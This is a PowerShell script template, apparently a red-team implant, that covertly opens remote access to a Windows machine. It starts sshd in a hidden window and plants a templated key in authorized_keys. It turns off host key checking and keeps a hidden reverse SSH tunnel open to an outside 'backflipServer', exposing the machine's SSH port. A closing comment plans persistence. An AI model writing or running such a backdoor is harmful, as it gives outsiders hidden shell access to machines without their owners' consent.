# Copyright (c) 2024, Oracle and/or its affiliates.
function Main(){
    $running = Get-Process "sshd";
    $image = Get-Command "sshd";
    $sshdPath = $image.Source;

    if ($running -eq $null)
    {
        Write-Output "sshd not running";
        if ($image.Source -eq $null)
        {
            Write-Output "sshd not found, BYOSSH";
            Exit;
        }
        else
        {
            if(Test-Path -Path (Join-Path $env:HOMEPATH ".ssh") -PathType Container){
                $dotSSH = Join-Path $env:HOMEPATH ".ssh";
            }
            else{
                Write-Output "The user doesn't have a dot ssh folder. Creating it.";
                $dotSSH = New-Item -Path $env:HOMEPATH -Name ".ssh" -ItemType "Directory";
                $dotSSH.Attributes = $dotSSH.Attributes -bor 'Hidden';
            }
            try {
                Write-Output "Starting sshd";
                "" | Add-Content -Path (Join-Path $env:ProgramData "ssh\sshd_config");
                if( -not (Test-Path -Path (Join-Path $dotSSH "__PROGRAMDATA__\ssh"))){
                    $hostKeys = New-Item -Path $dotSSH -Name "__PROGRAMDATA__\ssh" -ItemType "Directory";
                    & ssh-keygen.exe -A -f $dotSSH\;
                }
                & Start-Process $sshdPath -WindowStyle Hidden -Args "-h","$dotSSH\__PROGRAMDATA__\ssh\ssh_host_ed25519_key";
            }
            catch {
                Write-Output "Couldn't start sshd";
            }
        }
    }
    $dotSSH = Join-Path $env:HOMEPATH ".ssh";
    if(-not (Test-Path -Path (Join-Path $dotSSH "{{ my_priv_key }}"))){
        try {
            Write-Output "Adding keys";
            "{{ pubKey }}" | Add-Content -Path (Join-Path $dotSSH "authorized_keys");
            "{{ privKey }}" | Set-Content -Path (Join-Path $dotSSH "{{ my_priv_key }}");
            "{{ bsHostKey }}" | Add-Content -Path (Join-Path $dotSSH "known_hosts");
            & ssh.exe -oStrictHostKeyChecking=no -N -i $dotSSH/{{ my_priv_key }} -p{{ bsPort }} {{ faceplant }}-$env:username@{{ backflipServer }};
        }
        catch {
            Write-Output "Failed to add keys";
        }
    }
    if(Test-Path -Path (Join-Path $dotSSH "{{ marker }}")){$oldPid = Get-Content -Path (Join-Path $dotSSH "{{ marker }}") -TotalCount 1;}
    $pro = Get-Process -Id $oldPid;
    if ($pro -eq $null){
        Write-Output "Connecting";
        $sshProc = Start-Process ssh.exe -WindowStyle Hidden -PassThru -ArgumentList "-oStrictHostKeyChecking=no -N -i $dotSSH/{{ my_priv_key }} -N -R {{ remotePort }}:127.0.0.1:22 -p{{ bsPort }} {{ flipUser }}@{{ backflipServer }}";
        $sshProc.id | Set-Content -Path (Join-Path $dotSSH "{{ marker }}");
    }
}
Main;
;
# ToDo: Persistence